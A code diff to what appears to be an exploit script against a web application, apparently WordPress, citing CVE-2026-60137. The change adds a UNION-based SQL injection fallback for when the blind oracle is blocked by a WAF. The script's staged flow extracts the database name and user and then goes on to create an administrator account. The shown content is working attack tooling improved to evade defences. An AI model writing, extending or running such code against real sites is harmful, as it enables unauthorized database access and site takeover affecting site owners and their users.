@@ -508,12 +508,17 @@ def exploit(target, command=None):
 
     log(fy, "[2/5] SQLi (CVE-2026-60137)...", rs)
     s = BlindSQLi(client)
-    if not s.confirm():
-        log(fr, "[-] blind SQLi not confirmed", rs)
-        return None
-    db_name = s.extract("SELECT DATABASE()")
-    db_user = s.extract("SELECT CURRENT_USER()")
-    log(fg, "[+] blind SQLi OK | db=%s user=%s" % (db_name, db_user), rs)
+    blind_ok = s.confirm()
+    if blind_ok:
+        db_name = s.extract("SELECT DATABASE()")
+        db_user = s.extract("SELECT CURRENT_USER()")
+        log(fg, "[+] blind SQLi OK | db=%s user=%s" % (db_name, db_user), rs)
+    else:
+        u0 = UnionSQLi(client)
+        if not u0.available():
+            log(fr, "[-] SQLi not confirmed (blind oracle blocked + UNION unavailable - WAF/patched)", rs)
+            return None
+        log(fy, "[+] blind oracle blocked (user listing?) but UNION primitive works - continuing", rs)
 
     log(fy, "[3/5] creating administrator via oEmbed/loopback graph...", rs)
     creator = AdminCreator(client)
@@ -559,16 +564,20 @@ def check_only(target):
     log(fg, "[+] vulnerable (batch route confusion active)", rs)
     log(fy, "[check] SQLi confirmation (CVE-2026-60137)...", rs)
     s = BlindSQLi(client)
-    if not s.confirm():
-        log(fr, "[-] blind SQLi not confirmed", rs)
-        return "patched"
+    blind_ok = s.confirm()
     u = UnionSQLi(client)
-    if not u.available():
-        log(fr, "[-] blind SQLi OK but UNION primitive unavailable", rs)
+    union_ok = u.available()
+    if not blind_ok and not union_ok:
+        log(fr, "[-] SQLi not confirmed (WAF/plugin filtering author_exclude, or patched 60137)", rs)
         return "patched"
-    db_name = s.extract("SELECT DATABASE()")
-    db_user = s.extract("SELECT CURRENT_USER()")
-    log(fg, "[+] SQLi confirmed | db=%s user=%s | UNION primitive available" % (db_name, db_user), rs)
+    if blind_ok and not union_ok:
+        log(fy, "[+] blind SQLi OK but UNION primitive unavailable", rs)
+        return "vulnerable"
+    if not blind_ok and union_ok:
+        log(fy, "[+] blind oracle blocked (user listing?) but UNION primitive works", rs)
+    db_name = s.extract("SELECT DATABASE()") if blind_ok else u.extract("SELECT DATABASE()")
+    db_user = s.extract("SELECT CURRENT_USER()") if blind_ok else u.extract("SELECT CURRENT_USER()")
+    log(fg, "[+] SQLi confirmed | db=%s user=%s" % (db_name, db_user), rs)
     return "vulnerable"
 
 
